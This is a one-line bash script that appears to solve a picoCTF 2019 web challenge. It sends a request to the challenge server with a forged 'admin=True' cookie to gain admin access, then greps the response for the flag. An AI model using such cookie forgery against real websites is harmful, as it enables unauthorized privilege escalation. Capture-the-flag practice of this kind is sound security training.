#!/bin/bash

curl -v --cookie "admin=True" https://2019shell1.picoctf.com/problem/37907/flag | grep  -oE "picoCTF{.*?}"
